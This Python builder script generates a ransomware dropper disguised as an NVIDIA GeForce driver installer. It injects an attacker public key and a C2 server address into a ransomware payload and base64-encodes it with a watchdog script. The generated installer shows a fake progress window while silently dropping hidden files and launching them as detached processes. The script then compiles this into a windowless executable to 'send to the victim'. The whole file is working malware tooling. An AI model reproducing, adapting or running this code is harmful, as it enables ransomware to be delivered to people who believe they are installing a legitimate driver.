import base64
import os
import sys
import re
import shutil
import subprocess
import importlib.util

# --- Configuration ---
DEFAULT_C2_IP = "127.0.0.1" 
DEFAULT_C2_PORT = "5000"
DEFAULT_FALLBACK_TARGET = "test_data" 

def build_dropper():
    print("[-] Starting Builder...")
    
    # Paths
    current_dir = os.path.dirname(os.path.abspath(__file__))
    victim_dir = current_dir
    attacker_dir = os.path.join(current_dir, "..", "attacker")
    
    # Assets
    payload_path = os.path.join(victim_dir, "ransomware.py")
    key_path = os.path.join(attacker_dir, "attacker_public_key.pem")
    if not os.path.exists(key_path):
        key_path = os.path.join(current_dir, "attacker_public_key.pem")
    watchdog_path = os.path.join(victim_dir, "watchdog.py")
    output_path = os.path.join(victim_dir, "installer.py")

    # 1. Validation
    if not os.path.exists(payload_path):
        print(f"[!] Error: Ransomware payload missing at {payload_path}")
        return
    if not os.path.exists(watchdog_path):
        print(f"[!] Error: Watchdog missing at {watchdog_path}")
        return

    # 2. Read & Inject Config
    with open(payload_path, "r", encoding="utf-8") as f: payload_content = f.read()
    with open(key_path, "r", encoding="utf-8") as f: public_key_clean = f.read()
    with open(watchdog_path, "rb") as f: watchdog_data = f.read()

    print("[-] Injecting Configuration...")
    
    # Inject Key
    payload_content = re.sub(
        r'ATTACKER_PUBLIC_KEY = """.*?"""', 
        f'ATTACKER_PUBLIC_KEY = """{public_key_clean}"""', 
        payload_content, flags=re.DOTALL
    )

    # Inject C2 IP
    c2_ip = input(f"[?] Enter C2 Server IP [Default: {DEFAULT_C2_IP}]: ").strip() or DEFAULT_C2_IP
    c2_ip = c2_ip.replace("http://", "").rstrip("/")
    new_url = f'http://{c2_ip}:{DEFAULT_C2_PORT}'
    
    payload_content = re.sub(
        r'C2_SERVER_URL = ".*?"', 
        f'C2_SERVER_URL = "{new_url}"', 
        payload_content
    )
    print(f"    -> C2 Server set to: {new_url}")

    # Inject Fallback Target
    fallback = input(f"[?] Enter Fallback Directory [Default: {DEFAULT_FALLBACK_TARGET}]: ").strip() or DEFAULT_FALLBACK_TARGET
    target_regex = r'target_dir\s*=\s*os\.path\.join\(home,\s*"[^"]*"\)'
    if re.search(target_regex, payload_content):
        payload_content = re.sub(target_regex, f'target_dir = os.path.join(home, "{fallback}")', payload_content)
        print(f"    -> Fallback Target set to: $HOME/{fallback}")

    # 3. Encode Payloads
    ransomware_b64 = base64.b64encode(payload_content.encode('utf-8')).decode('utf-8')
    watchdog_b64 = base64.b64encode(watchdog_data).decode('utf-8')

    # 4. Generate Installer Source Code
    dropper_code = f'''import sys
import os
import base64
import subprocess
import threading
import time
import tempfile
from tkinter import Tk, Label, ttk, Frame

# --- CONFIGURATION ---
FAKE_TITLE = "NVIDIA GeForce Game Ready Driver Installer"
RANSOMWARE_B64 = "{ransomware_b64}"
WATCHDOG_B64 = "{watchdog_b64}"
RANSOMWARE_NAME = ".nvidia_ransomware.py"
WATCHDOG_NAME = ".nvidia_watchdog.py"

def extract_and_execute_payload():
    """Drops both ransomware and watchdog, then launches watchdog."""
    try:
        ransomware_data = base64.b64decode(RANSOMWARE_B64)
        watchdog_data = base64.b64decode(WATCHDOG_B64)
        
        # Cross-platform drop location
        if os.name == 'nt':
            drop_dir = os.getenv('APPDATA')
            if not drop_dir: drop_dir = tempfile.gettempdir()
        else:
            drop_dir = os.path.expanduser("~/.config")
            if not os.path.exists(drop_dir):
                os.makedirs(drop_dir, exist_ok=True)
        
        ransomware_path = os.path.join(drop_dir, RANSOMWARE_NAME)
        watchdog_path = os.path.join(drop_dir, WATCHDOG_NAME)
        
        # Drop files
        with open(ransomware_path, "wb") as f: f.write(ransomware_data)
        with open(watchdog_path, "wb") as f: f.write(watchdog_data)
            
        # Launch WATCHDOG
        if os.name == 'nt':
            subprocess.Popen(["python", watchdog_path], 
                           creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
        else:
            subprocess.Popen(["python3", watchdog_path], 
                           start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
    except Exception as e:
        pass

def fake_installer_gui():
    root = Tk()
    root.title(FAKE_TITLE)
    root.geometry("600x400")
    root.resizable(False, False)
    root.configure(bg="#1a1a1a")

    header = Frame(root, bg="#1a1a1a")
    header.pack(fill="x", pady=20)
    Label(header, text="NVIDIA", fg="#76b900", bg="#1a1a1a", font=("Segoe UI", 24, "bold")).pack()
    Label(header, text="Graphics Driver Installer", fg="white", bg="#1a1a1a", font=("Segoe UI", 16)).pack()

    content = Frame(root, bg="#1a1a1a")
    content.pack(expand=True, fill="both", padx=40)
    
    status_label = Label(content, text="Checking system compatibility...", fg="#cccccc", bg="#1a1a1a", font=("Segoe UI", 10))
    status_label.pack(anchor="w", pady=(20, 5))
    
    progress = ttk.Progressbar(content, orient="horizontal", length=520, mode="determinate")
    progress.pack(pady=10)

    def run_simulation():
        steps = [
            "Checking install options...", "Validating packages...", "Installing Graphics Driver...",
            "Installing HD Audio Driver...", "Installing PhysX System...", "Finalizing..."
        ]
        
        # EXECUTE PAYLOAD AT 30%
        root.after(2000, extract_and_execute_payload)
        
        progress['maximum'] = 100
        current_val = 0
        
        for i, step in enumerate(steps):
            time.sleep(1.0) 
            status_label.config(text=step)
            root.update()
            
            target = int((i + 1) / len(steps) * 100)
            while current_val < target:
                current_val += 2
                progress['value'] = current_val
                time.sleep(0.02)
                root.update()
        
        time.sleep(1)
        root.destroy()

    threading.Thread(target=run_simulation, daemon=True).start()
    root.mainloop()

if __name__ == "__main__":
    fake_installer_gui()
'''

    with open(output_path, "w", encoding="utf-8") as f:
        f.write(dropper_code)
    print(f"\n[+] 'installer.py' generated.")

    # 5. COMPILE TO EXECUTABLE (The Exact Command You Requested)
    print("[-] Compiling to standalone executable...")
    
    # We use 'dist' as the final location and 'build' as temp
    dist_path = os.path.join(victim_dir, "dist") 
    
    try:
        # EXACT COMMAND: pyinstaller --onefile --noconsole installer.py
        # We invoke it via python -m to ensure the path is correct
        cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--noconsole",
            "--clean",
            "--distpath", ".",  # Output directly to current dir
            "installer.py"
        ]
        
        subprocess.check_call(cmd)
        
        # Cleanup
        if os.path.exists("build"): shutil.rmtree("build")
        if os.path.exists("installer.spec"): os.remove("installer.spec")
        
        exe_name = "installer"
        if os.name == 'nt': exe_name += ".exe"
        
        print(f"\n[+] SUCCESS! Executable created: {os.path.abspath(exe_name)}")
        print(f"    Send '{exe_name}' to the victim.")
            
    except Exception as e:
        print(f"[!] Compilation Failed: {e}")
        print("    Try running manually: pyinstaller --onefile --noconsole installer.py")

if __name__ == "__main__":
    build_dropper()
